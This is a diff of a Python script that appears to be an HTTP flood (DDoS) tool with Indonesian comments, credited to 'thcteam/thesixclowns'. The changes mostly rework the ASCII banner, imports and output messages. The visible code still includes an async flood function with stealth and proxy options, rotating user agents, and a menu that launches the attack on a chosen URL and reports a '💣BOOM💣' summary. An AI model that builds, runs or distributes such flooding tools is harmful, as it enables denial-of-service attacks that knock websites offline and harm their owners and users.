@@ -1,15 +1,26 @@
-import aiohttp
-import asyncio
-import random
-import itertools
-import time
-import re
-import string
 import sys
-import shutil
-from colorama import Fore, init
+import requests
+import asyncio
+import aiohttp
+import random
+from bs4 import BeautifulSoup
+from datetime import datetime
+import time
+import os
 
-  #Konfigurasi dasar
+# ASCII Art
+ASCII_ART = """
+ ⠀⠀⠀⠀⠀⠀⠀⠀    .___  .___                                   .__      __  .__            
+  __| _/__| _/____  ______ _______   ____ _____  |  |   _/  |_|  |__   ____  
+ / __ |/ __ |/  _ \/  ___/ \_  __ \_/ __ \\__  \ |  |   \   __\  |  \_/ ___\ 
+/ /_/ / /_/ (  <_> )___ \   |  | \/\  ___/ / __ \|  |__  |  | |   Y  \  \___ 
+\____ \____ |\____/____  >  |__|    \___  >____  /____/  |__| |___|  /\___  >
+     \/    \/          \/               \/     \/                  \/     \/                                                         
+                                                                              
+                                                                                                                                                                          
+"""
+
+# Konfigurasi dasar
 DEFAULT_REQUESTS = 1000
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -205,29 +216,15 @@ async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
             success_count += results.count("Berhasil")
             failure_count += results.count("Gagal")
             show_progress(100)  # Pastikan progres mencapai 100%
-    def run(self):
-        asyncio.run(self.attack())
 
-def print_banner():
-    columns = shutil.get_terminal_size().columns
-    banner = r"""
-    .___  .___                                   .__      __  .__            
-  __| _/__| _/____  ______ _______   ____ _____  |  |   _/  |_|  |__   ____  
- / __ |/ __ |/  _ \/  ___/ \_  __ \_/ __ \\__  \ |  |   \   __\  |  \_/ ___\ 
-/ /_/ / /_/ (  <_> )___ \   |  | \/\  ___/ / __ \|  |__  |  | |   Y  \  \___ 
-\____ \____ |\____/____  >  |__|    \___  >____  /____/  |__| |___|  /\___  >
-     \/    \/          \/               \/     \/                  \/     \/ 
-                                                              
- made by thcteam/thesixclowns
-"""   
-  end_time = time.time()
+    end_time = time.time()
     elapsed_time = end_time - start_time
 
-    print("\n\n===== 💣attack💣 =====")
+    print("\n\n===== 💣BOOM💣 =====")
     print(f"URL Target: {url}")
-    print(f"num requests: {num_requests}")
+    print(f"num requestn: {num_requests}")
     print(f"succes count: {success_count}")
-    print(f"failuree count: {failure_count}")
+    print(f"failure count: {failure_count}")
     print(f"time: {elapsed_time:.2f} detik")
     print("==========================")
 
@@ -250,8 +247,8 @@ url = None
 num_requests = DEFAULT_REQUESTS
 stealth_mode = False
 use_proxy = False
-proxies = []  #
-ascii_printed = False  # 
+proxies = []  # Daftar proxy yang akan digunakan
+ascii_printed = False  # Tambahkan variabel untuk melacak apakah ASCII sudah dicetak
 
 # Fungsi utama yang memproses menu dan memulai serangan
 def main():
@@ -298,11 +295,10 @@ def main():
                 asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
                 print("Serangan selesai.")
         elif choice == '6':
-            print("\n--GOOD BYE FRIEND--")
+            print("\n--THESIXCLOWN--")
             break
         else:
             print("Opsi tidak valid. Silakan coba lagi.")
 
 if __name__ == "__main__":
     main()
- 
